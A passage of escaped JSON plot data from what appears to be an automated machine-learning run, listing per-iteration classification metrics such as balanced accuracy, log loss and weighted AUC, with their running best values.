\"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"35\", \"37\"], \"mode\": \"lines\", \"name\": \"f1_score_macro_max\", \"stepped\": true, \"type\": \"scatter\", \"data\": [0.7060869524729553, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352, 0.7386733613551352]}], \"balanced_accuracy\": [{\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"35\", \"37\"], \"mode\": \"markers\", \"name\": \"balanced_accuracy\", \"stepped\": false, \"type\": \"scatter\", \"data\": [0.7053588221478819, 0.7368196523334581, 0.6997274314393966, 0.7434066955807006, 0.6569935550874269, 0.7042948573195356, 0.6845133111809001, 0.6262336216201699, 0.5185808194703185, 0.7214044431982501, 0.7164428145590618, 0.7348771448214855, 0.7098630412099547, 0.7066421706909842, 0.6992182246349378, 0.6977164755159225, 0.7191804363584866, 0.7281974491097826, 0.7364097096537673, 0.7292912489194303, 0.6580260384323394, 0.7338151230656906, 0.705585176022082, 0.7179292458404329, 0.7156477478367164, 0.7011894539861812, 0.7219346971919903, 0.7013386491181416, 0.708226466134825, 0.7292010054985585, 0.7127841220062067, 0.7296660356557477, 0.7054055099793615, 0.7206081942632352, 0.7315550468438914, 0.6976899975757002, 0.7275937806179847]}, {\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"35\", \"37\"], \"mode\": \"lines\", \"name\": \"balanced_accuracy_max\", \"stepped\": true, \"type\": \"scatter\", \"data\": [0.7053588221478819, 0.7368196523334581, 0.7368196523334581, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006]}], \"recall_score_macro\": [{\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"35\", \"37\"], \"mode\": \"markers\", \"name\": \"recall_score_macro\", \"stepped\": false, \"type\": \"scatter\", \"data\": [0.7053588221478819, 0.7368196523334581, 0.6997274314393966, 0.7434066955807006, 0.6569935550874269, 0.7042948573195356, 0.6845133111809001, 0.6262336216201699, 0.5185808194703185, 0.7214044431982501, 0.7164428145590618, 0.7348771448214855, 0.7098630412099547, 0.7066421706909842, 0.6992182246349378, 0.6977164755159225, 0.7191804363584866, 0.7281974491097826, 0.7364097096537673, 0.7292912489194303, 0.6580260384323394, 0.7338151230656906, 0.705585176022082, 0.7179292458404329, 0.7156477478367164, 0.7011894539861812, 0.7219346971919903, 0.7013386491181416, 0.708226466134825, 0.7292010054985585, 0.7127841220062067, 0.7296660356557477, 0.7054055099793615, 0.7206081942632352, 0.7315550468438914, 0.6976899975757002, 0.7275937806179847]}, {\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"35\", \"37\"], \"mode\": \"lines\", \"name\": \"recall_score_macro_max\", \"stepped\": true, \"type\": \"scatter\", \"data\": [0.7053588221478819, 0.7368196523334581, 0.7368196523334581, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006, 0.7434066955807006]}], \"average_precision_score_micro\": [{\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"35\", \"37\"], \"mode\": \"markers\", \"name\": \"average_precision_score_micro\", \"stepped\": false, \"type\": \"scatter\", \"data\": [0.8229290538102472, 0.8549562655774119, 0.8303283741907455, 0.8330845762199072, 0.828758831843021, 0.8456959171705163, 0.8380140439837293, 0.814539689264401, 0.7947468194093201, 0.7920980772243272, 0.8071741537675543, 0.813739047033503, 0.787761787792839, 0.8440167132857228, 0.8330487088071408, 0.8438346262424764, 0.8126258091491018, 0.8155014863847416, 0.8035325699318557, 0.848898506132646, 0.7917496271788471, 0.8485687405511617, 0.8389823937410112, 0.8505611907255286, 0.8561553844277275, 0.8280057957849134, 0.8537464406732578, 0.813259039495868, 0.835167072801771, 0.8568994459568167, 0.8396407933099166, 0.8514482476761829, 0.8249900345621379, 0.8417925275679238, 0.8166293215141243, 0.8293173352087979, 0.8633423583810256]}, {\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"35\", \"37\"], \"mode\": \"lines\", \"name\": \"average_precision_score_micro_max\", \"stepped\": true, \"type\": \"scatter\", \"data\": [0.8229290538102472, 0.8549562655774119, 0.8549562655774119, 0.8549562655774119, 0.8549562655774119, 0.8549562655774119, 0.8549562655774119, 0.8549562655774119, 0.8549562655774119, 0.8549562655774119, 0.8549562655774119, 0.8549562655774119, 0.8549562655774119, 0.8549562655774119, 0.8549562655774119, 0.8549562655774119, 0.8549562655774119, 0.8549562655774119, 0.8549562655774119, 0.8549562655774119, 0.8549562655774119, 0.8549562655774119, 0.8549562655774119, 0.8549562655774119, 0.8561553844277275, 0.8561553844277275, 0.8561553844277275, 0.8561553844277275, 0.8561553844277275, 0.8568994459568167, 0.8568994459568167, 0.8568994459568167, 0.8568994459568167, 0.8568994459568167, 0.8568994459568167, 0.8568994459568167, 0.8633423583810256]}], \"precision_score_macro\": [{\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"35\", \"37\"], \"mode\": \"markers\", \"name\": \"precision_score_macro\", \"stepped\": false, \"type\": \"scatter\", \"data\": [0.7112261247846459, 0.7448891884111544, 0.7412437291975656, 0.7282014809362192, 0.7228626746109506, 0.754845285204295, 0.7634509904580229, 0.7304569799898089, 0.6629291102448998, 0.7050597742747493, 0.7015027142872479, 0.7143809999897199, 0.6944180973613248, 0.7365605949242839, 0.7361572460451299, 0.7569425310360065, 0.7103211870370707, 0.7112832335537247, 0.7223284815282593, 0.7396391393586124, 0.6878370755873278, 0.7403965681149594, 0.718134752697632, 0.7347046784537198, 0.734619674141489, 0.729697651933254, 0.7440049110915183, 0.7107737856506116, 0.7211120271690014, 0.7480698102105652, 0.7228507589623634, 0.7452104059512779, 0.7414462292259829, 0.7502945844005524, 0.7222131525336194, 0.7295088530078773, 0.7465465604170699]}, {\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"35\", \"37\"], \"mode\": \"lines\", \"name\": \"precision_score_macro_max\", \"stepped\": true, \"type\": \"scatter\", \"data\": [0.7112261247846459, 0.7448891884111544, 0.7448891884111544, 0.7448891884111544, 0.7448891884111544, 0.754845285204295, 0.7634509904580229, 0.7634509904580229, 0.7634509904580229, 0.7634509904580229, 0.7634509904580229, 0.7634509904580229, 0.7634509904580229, 0.7634509904580229, 0.7634509904580229, 0.7634509904580229, 0.7634509904580229, 0.7634509904580229, 0.7634509904580229, 0.7634509904580229, 0.7634509904580229, 0.7634509904580229, 0.7634509904580229, 0.7634509904580229, 0.7634509904580229, 0.7634509904580229, 0.7634509904580229, 0.7634509904580229, 0.7634509904580229, 0.7634509904580229, 0.7634509904580229, 0.7634509904580229, 0.7634509904580229, 0.7634509904580229, 0.7634509904580229, 0.7634509904580229, 0.7634509904580229]}], \"precision_score_micro\": [{\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"35\", \"37\"], \"mode\": \"markers\", \"name\": \"precision_score_micro\", \"stepped\": false, \"type\": \"scatter\", \"data\": [0.7396103896103897, 0.7695659603554341, 0.7578605604921395, 0.7500341763499658, 0.7305878332194122, 0.7669856459330144, 0.7591079972658921, 0.7212918660287081, 0.6626794258373205, 0.7174982911825017, 0.713585099111415, 0.7226930963773069, 0.7043062200956937, 0.7565618591934381, 0.7539815447710184, 0.7630895420369106, 0.7330997949419003, 0.7292207792207792, 0.7409774436090226, 0.7656356801093642, 0.7149179767600822, 0.7643882433356118, 0.7448906356801095, 0.7591934381408066, 0.7591592617908407, 0.7525632262474369, 0.7644053315105948, 0.7395933014354067, 0.746120984278879, 0.76825017088175, 0.7487525632262473, 0.7656698564593301, 0.7578434723171565, 0.7696001367054001, 0.746103896103896, 0.7512816131237183, 0.7695659603554341]}, {\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"35\", \"37\"], \"mode\": \"lines\", \"name\": \"precision_score_micro_max\", \"stepped\": true, \"type\": \"scatter\", \"data\": [0.7396103896103897, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7696001367054001, 0.7696001367054001, 0.7696001367054001, 0.7696001367054001]}], \"weighted_accuracy\": [{\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"35\", \"37\"], \"mode\": \"markers\", \"name\": \"weighted_accuracy\", \"stepped\": false, \"type\": \"scatter\", \"data\": [0.7658219048734536, 0.7945054420815822, 0.8022756856702659, 0.7539635062685835, 0.7883380484426679, 0.8146849266021343, 0.8169201041682094, 0.7949610636374129, 0.7748105940451986, 0.7151337372904871, 0.7113271556893389, 0.7142124419244918, 0.6980788400968526, 0.7947134642091852, 0.7969561643323242, 0.8130353945549913, 0.7428381025610203, 0.7290398330153791, 0.7437003319137385, 0.7923072490351333, 0.7592209911298663, 0.7876656489043206, 0.7737974914965314, 0.7901618529545623, 0.791721922438339, 0.7917649472538446, 0.7967725826069665, 0.7682773412831079, 0.7752159501425506, 0.7981297801675561, 0.775974847034781, 0.7932520797861841, 0.7971260620642593, 0.8070377380267288, 0.7556480978965568, 0.7921448699416143, 0.8006333997388213]}, {\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"35\", \"37\"], \"mode\": \"lines\", \"name\": \"weighted_accuracy_max\", \"stepped\": true, \"type\": \"scatter\", \"data\": [0.7658219048734536, 0.7945054420815822, 0.8022756856702659, 0.8022756856702659, 0.8022756856702659, 0.8146849266021343, 0.8169201041682094, 0.8169201041682094, 0.8169201041682094, 0.8169201041682094, 0.8169201041682094, 0.8169201041682094, 0.8169201041682094, 0.8169201041682094, 0.8169201041682094, 0.8169201041682094, 0.8169201041682094, 0.8169201041682094, 0.8169201041682094, 0.8169201041682094, 0.8169201041682094, 0.8169201041682094, 0.8169201041682094, 0.8169201041682094, 0.8169201041682094, 0.8169201041682094, 0.8169201041682094, 0.8169201041682094, 0.8169201041682094, 0.8169201041682094, 0.8169201041682094, 0.8169201041682094, 0.8169201041682094, 0.8169201041682094, 0.8169201041682094, 0.8169201041682094, 0.8169201041682094]}], \"norm_macro_recall\": [{\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"35\", \"37\"], \"mode\": \"markers\", \"name\": \"norm_macro_recall\", \"stepped\": false, \"type\": \"scatter\", \"data\": [0.41071764429576385, 0.4736393046669162, 0.3994548628787934, 0.4868133911614013, 0.3139871101748537, 0.40858971463907096, 0.36902662236180006, 0.2524672432403399, 0.03716163894063691, 0.44280888639650035, 0.43288562911812356, 0.4697542896429711, 0.4197260824199095, 0.41328434138196846, 0.39843644926987565, 0.3954329510318451, 0.43836087271697305, 0.4563948982195649, 0.4728194193075348, 0.4585824978388608, 0.31605207686467884, 0.4676302461313814, 0.41117035204416386, 0.435858491680866, 0.43129549567343267, 0.4023789079723622, 0.4438693943839807, 0.40267729823628323, 0.41645293226964986, 0.45840201099711686, 0.4255682440124132, 0.4593320713114954, 0.4108110199587228, 0.44121638852647027, 0.4631100936877828, 0.39537999515140043, 0.4551875612359694]}, {\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"35\", \"37\"], \"mode\": \"lines\", \"name\": \"norm_macro_recall_max\", \"stepped\": true, \"type\": \"scatter\", \"data\": [0.41071764429576385, 0.4736393046669162, 0.4736393046669162, 0.4868133911614013, 0.4868133911614013, 0.4868133911614013, 0.4868133911614013, 0.4868133911614013, 0.4868133911614013, 0.4868133911614013, 0.4868133911614013, 0.4868133911614013, 0.4868133911614013, 0.4868133911614013, 0.4868133911614013, 0.4868133911614013, 0.4868133911614013, 0.4868133911614013, 0.4868133911614013, 0.4868133911614013, 0.4868133911614013, 0.4868133911614013, 0.4868133911614013, 0.4868133911614013, 0.4868133911614013, 0.4868133911614013, 0.4868133911614013, 0.4868133911614013, 0.4868133911614013, 0.4868133911614013, 0.4868133911614013, 0.4868133911614013, 0.4868133911614013, 0.4868133911614013, 0.4868133911614013, 0.4868133911614013, 0.4868133911614013]}], \"log_loss\": [{\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"35\", \"37\"], \"mode\": \"markers\", \"name\": \"log_loss\", \"stepped\": false, \"type\": \"scatter\", \"data\": [0.6480770950597856, 0.4752990014529053, 0.5083900499315741, 0.5121177984927785, 0.525134470029037, 0.49545025791491837, 0.5150584025899052, 0.5464705000949333, 0.5883313154082292, 0.6343668816954893, 0.568675642097121, 0.5726588155970334, 0.6541852724426901, 0.5399900419024505, 0.5029078079049443, 0.5003251427420995, 0.5581651406007987, 0.5710693394911526, 0.5869289495391556, 0.4925117186247898, 0.5495794746940917, 0.4953372290721231, 0.5201432773723467, 0.481328576198746, 0.4705862950510872, 0.546280975772284, 0.47656689547691516, 0.665186068910875, 0.5490501417451764, 0.47073718950505244, 0.5211549855856794, 0.4799894260007519, 0.5276436599975062, 0.4887785692916329, 0.5185058277493115, 0.5468321409541537, 0.48241460484060417]}, {\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"35\", \"37\"], \"mode\": \"lines\", \"name\": \"log_loss_min\", \"stepped\": true, \"type\": \"scatter\", \"data\": [0.6480770950597856, 0.4752990014529053, 0.4752990014529053, 0.4752990014529053, 0.4752990014529053, 0.4752990014529053, 0.4752990014529053, 0.4752990014529053, 0.4752990014529053, 0.4752990014529053, 0.4752990014529053, 0.4752990014529053, 0.4752990014529053, 0.4752990014529053, 0.4752990014529053, 0.4752990014529053, 0.4752990014529053, 0.4752990014529053, 0.4752990014529053, 0.4752990014529053, 0.4752990014529053, 0.4752990014529053, 0.4752990014529053, 0.4752990014529053, 0.4705862950510872, 0.4705862950510872, 0.4705862950510872, 0.4705862950510872, 0.4705862950510872, 0.4705862950510872, 0.4705862950510872, 0.4705862950510872, 0.4705862950510872, 0.4705862950510872, 0.4705862950510872, 0.4705862950510872, 0.4705862950510872]}], \"recall_score_weighted\": [{\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"35\", \"37\"], \"mode\": \"markers\", \"name\": \"recall_score_weighted\", \"stepped\": false, \"type\": \"scatter\", \"data\": [0.7396103896103897, 0.7695659603554341, 0.7578605604921395, 0.7500341763499658, 0.7305878332194122, 0.7669856459330144, 0.7591079972658921, 0.7212918660287081, 0.6626794258373205, 0.7174982911825017, 0.713585099111415, 0.7226930963773069, 0.7043062200956937, 0.7565618591934381, 0.7539815447710184, 0.7630895420369106, 0.7330997949419003, 0.7292207792207792, 0.7409774436090226, 0.7656356801093642, 0.7149179767600822, 0.7643882433356118, 0.7448906356801095, 0.7591934381408066, 0.7591592617908407, 0.7525632262474369, 0.7644053315105948, 0.7395933014354067, 0.746120984278879, 0.76825017088175, 0.7487525632262473, 0.7656698564593301, 0.7578434723171565, 0.7696001367054001, 0.746103896103896, 0.7512816131237183, 0.7695659603554341]}, {\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"35\", \"37\"], \"mode\": \"lines\", \"name\": \"recall_score_weighted_max\", \"stepped\": true, \"type\": \"scatter\", \"data\": [0.7396103896103897, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7696001367054001, 0.7696001367054001, 0.7696001367054001, 0.7696001367054001]}], \"precision_score_weighted\": [{\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"35\", \"37\"], \"mode\": \"markers\", \"name\": \"precision_score_weighted\", \"stepped\": false, \"type\": \"scatter\", \"data\": [0.7396148182527014, 0.7692657656068833, 0.7561299494562312, 0.7670040988121269, 0.7326665944213182, 0.7656255975030734, 0.7673518015801541, 0.7312248313306742, 0.6639899105245636, 0.7495007418766727, 0.7469770395665697, 0.7609982789527787, 0.7405720187635425, 0.7552237707775337, 0.7547265846829997, 0.7663036635404484, 0.7484310264108975, 0.7548434967563924, 0.7630181885011696, 0.7631865534306315, 0.7116451604489596, 0.766965482354679, 0.7462686320677201, 0.7597847390466947, 0.7584467389162326, 0.7482479701952227, 0.7648891326044283, 0.7394720645437738, 0.7470513241044096, 0.771368557186541, 0.7503932984176136, 0.7690227457945608, 0.760514303827189, 0.7685339489826466, 0.7583246574646643, 0.7473999212892053, 0.7695397810264009]}, {\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"35\", \"37\"], \"mode\": \"lines\", \"name\": \"precision_score_weighted_max\", \"stepped\": true, \"type\": \"scatter\", \"data\": [0.7396148182527014, 0.7692657656068833, 0.7692657656068833, 0.7692657656068833, 0.7692657656068833, 0.7692657656068833, 0.7692657656068833, 0.7692657656068833, 0.7692657656068833, 0.7692657656068833, 0.7692657656068833, 0.7692657656068833, 0.7692657656068833, 0.7692657656068833, 0.7692657656068833, 0.7692657656068833, 0.7692657656068833, 0.7692657656068833, 0.7692657656068833, 0.7692657656068833, 0.7692657656068833, 0.7692657656068833, 0.7692657656068833, 0.7692657656068833, 0.7692657656068833, 0.7692657656068833, 0.7692657656068833, 0.7692657656068833, 0.7692657656068833, 0.771368557186541, 0.771368557186541, 0.771368557186541, 0.771368557186541, 0.771368557186541, 0.771368557186541, 0.771368557186541, 0.771368557186541]}], \"AUC_weighted\": [{\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"35\", \"37\"], \"mode\": \"markers\", \"name\": \"AUC_weighted\", \"stepped\": false, \"type\": \"scatter\", \"data\": [0.7981013916226355, 0.8366210317228242, 0.8030494637270778, 0.8198316776873271, 0.8093759781502279, 0.8250904972277524, 0.8195960708363262, 0.8008359558229188, 0.7886115736818784, 0.7871991886223147, 0.8053989377753364, 0.8141928080491712, 0.7889761842546829, 0.8208075252024681, 0.8128728350343156, 0.8276031965600499, 0.8032769153548713, 0.8069059298023245, 0.8012340709287968, 0.8240266352875374, 0.749247482076519, 0.8298472723094127, 0.8152208505797622, 0.8314593290642994, 0.8365872221245754, 0.8124205292040025, 0.8348875650394476, 0.7868068256935232, 0.8132809201585477, 0.8355482935053852, 0.8196271627841287, 0.8307167934281547, 0.8090337634387126, 0.8218452677882355, 0.820877160255649, 0.8126561686834268, 0.8445341412720611]}, {\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"35\", \"37\"], \"mode\": \"lines\", \"name\": \"AUC_weighted_max\", \"stepped\": true, \"type\": \"scatter\", \"data\": [0.7981013916226355, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8445341412720611]}], \"average_precision_score_weighted\": [{\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"35\", \"37\"], \"mode\": \"markers\", \"name\": \"average_precision_score_weighted\", \"stepped\": false, \"type\": \"scatter\", \"data\": [0.8088900198552287, 0.8456601055549087, 0.8220099301043277, 0.8344884683622087, 0.8238877410299625, 0.8401883838512969, 0.8377138081746119, 0.8188522900806845, 0.8090520457021568, 0.8062985856831574, 0.8189116535285532, 0.8260406497980938, 0.8054878586820766, 0.8362007182476587, 0.82558756057285, 0.8376771958797627, 0.8237147107874433, 0.8244866891363234, 0.8145558127742669, 0.8353056656890262, 0.7786139218149057, 0.8366171171379992, 0.8266773135730267, 0.8410095977435882, 0.84663811871538, 0.8163053414815916, 0.8439954254718982, 0.8036932228257159, 0.8253850658441383, 0.8474423798967363, 0.8298815044726062, 0.8423841910540661, 0.8227888822433606, 0.8353408418310716, 0.8346412757929279, 0.8166568935320472, 0.8573598365512292]}, {\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", 